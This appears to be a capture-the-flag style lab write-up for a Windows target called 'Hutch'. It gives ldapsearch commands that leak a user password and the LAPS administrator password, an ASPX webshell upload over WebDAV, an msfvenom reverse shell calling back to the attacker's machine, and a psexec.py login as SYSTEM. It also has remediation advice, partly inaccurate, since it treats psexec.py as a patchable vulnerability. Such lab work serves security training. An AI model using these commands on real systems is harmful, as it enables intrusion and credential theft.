# Resolution summary
- discovered that the ldap domain is hutch.offsec
- Used ldapsearch to obtain the password and username
- Used the found login information to access the Cadevar tool
- Found port 80 was running Microsoft IIS
- Downloaded the aspx webshell on the cadaver target machine.
- Used a web browser to navigate to a webshell page and discovered command execution
- Googled Microsoft IIS 10.0's root directory location
- Downloaded reverse shell in cadaver
- Utilizing webshell command execution I confirmed the reverse shell was downloaded in the root directory
- Started netcat listener on kali machine
- Executed the reverse shell and received a reverse shelll
- Found Local Administrator Password Solution (LAPS) is installed on the target machine
- Performed ldapsearch query and found the administrators password
- Login as administrator utilizing psexec.py and receive a session running as nt authority/system

## Improved skills
- ldapsearch enumeration
- Findng allowed file extensions for Microsoft IIS to download a webshell
- Downloading webshells/reverse shellls while logged into cadaver tool
- Local Administrator Password Solution (LAPS) enumeration
- psexec.py 

## Used tools
- nmap
- ldapsearch
- cadaver
- psexec.py

### **Vulnerability Explanation:**

### Initial Access
##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

1. LDAP Information Leak:
    - Identified a misconfigured LDAP server that exposed sensitive information, including user credentials and server configurations.
    - Exploited the LDAP information leak to gather valid credentials for accessing other systems.
2. Webdav Upload and Reverse Shell:
    - Leveraged the obtained credentials to access the webdav server and upload a web shell.
    - Executed a reverse shell payload through the web shell to establish a reverse connection and gain remote access to the target system.
    - Demonstrated the ability to execute arbitrary commands with elevated privileges.


### **Vulnerability Fix:**
### Initial Access

##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

1. LDAP Configuration:
    - Secure the LDAP server configuration by implementing proper access controls, encryption (e.g., LDAPS), and regular security audits.
    - Avoid exposing sensitive information through LDAP queries and ensure that only authorized users have access to required data.
2. Webdav Server Security:
    - Harden the webdav server configuration by enforcing strong authentication mechanisms, access controls, and file upload restrictions.
    - Monitor and log webdav server activities to detect and respond to suspicious or unauthorized access attempts.
3. Reverse Shell Prevention:
    - Implement network segmentation and firewall rules to restrict inbound and outbound traffic, preventing unauthorized reverse shell connections.
    - Regularly update and patch systems to mitigate known vulnerabilities that could be exploited to execute reverse shells.



### **Vulnerability Explanation:**
#### Privilege Escalation
###### Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

1. LDAP Credential Retrieval:
    - Exploited a misconfigured LDAP server to perform an ldapsearch query and retrieve administrator credentials.
    - Demonstrated the risk of exposing sensitive information via LDAP queries and improper access controls.
2. psexec.py Exploitation:
    - Leveraged the obtained administrator credentials to exploit the psexec.py vulnerability in the Windows server.
    - Successfully gained remote code execution as an administrator, allowing full control over the target system.


### **Vulnerability Fix:**
#### Privilege Escalation
###### Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

1. LDAP Security:
    - Secure the LDAP server configuration by implementing proper access controls, encryption (e.g., LDAPS), and regular security audits.
    - Avoid exposing sensitive information through LDAP queries and ensure that only authorized users have access to required data.
2. Windows Server Hardening:
    - Patch and update the Windows server to mitigate known vulnerabilities like the psexec.py vulnerability.
    - Implement strong authentication mechanisms, firewall rules, and intrusion detection systems to prevent unauthorized access and exploitation.
3. Least Privilege Principle:
    - Follow the principle of least privilege by granting minimal permissions necessary for users and services, including LDAP query access and administrator privileges.
4. Security Awareness:
    - Educate system administrators and users about the risks associated with LDAP misconfigurations, credential retrieval vulnerabilities, and remote code execution exploits.

## Port 389/ 3268- LDAP

- To further enumerate the LDAP service, the command nmap -n -sV -Pnâ€Š-â€Šscript "ldap* and not brute" 192.168.142.122 was executed, revealing the domain "hutch.offsec" associated with LDAP.

![](Images/Pasted%20image%2020221019004447.png)

A subsequent LDAP search (ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.142.122" "(objectclass=*)") provided additional information, including a user named Freddy McsSorley (account name: fmcsorley) with the password "CrabSharkJellyfish192."

## Port 80 - Microsoft IIS httpd 10.0
Using the discovered credentials, the cadaver tool was able to establish a connection to the target machine (cadaver http://192.168.142.122). A webshell (cmdasp.aspx) was then uploaded to the target machine using the put command. The webshell could be accessed at http://192.168.142.122/cmdasp.aspx, allowing command execution on the target.

# Exploitation
##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

To gain a reverse shell, the root directory for Microsoft IIS 10.0 was determined through online research. Using msfvenom, a reverse shell payload was created: msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe.

![](Images/Pasted%20image%2020221019011200.png)
#Microsoft-IIS/10.0RootDirectory

![](Images/Pasted%20image%2020221019011410.png)

The payload was hosted on our Kali machine by typing "updog -p 80"

- The payload is then uploaded to the root web server by entering the following command into the cadaver tool.

put [path where payload is located]/reverse.exe

![](Images/Pasted%20image%2020221019011613.png)

- To verify that the reverse shell payload was on the target machine, we type "dir C:\inetpub\wwwroot".
  
![](Images/Pasted%20image%2020221019011821.png)

A netcat listener was started on the Kali machine (nc -lvp 593), and the reverse shell was executed by running C:\inetpub\wwwroot\reverse.exe through the webshell. This resulted in a successful reverse shell connection.

# Privilege Escalation
## Local Enumeration

During local enumeration, it was discovered that Microsoft's Local Administrator Password Solution (LAPS) was installed in the C:\Program Files directory.

![](Images/Pasted%20image%2020221019012502.png)

![](Images/Pasted%20image%2020221019012617.png)
#LAPS #LocalAdministratorPasswordSolution


## Privilege Escalation vector
Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

To escalate privileges, an LDAP search was performed to retrieve the local administrator password: ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd. The search revealed the administrator password as ",G4$4Yk-2n&x(]".

![](Images/Pasted%20image%2020221019012818.png)

Using the obtained administrator credentials, privilege escalation was achieved by logging in with psexec.py as the administrator: python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122. This provided a shell running as nt authority\system.
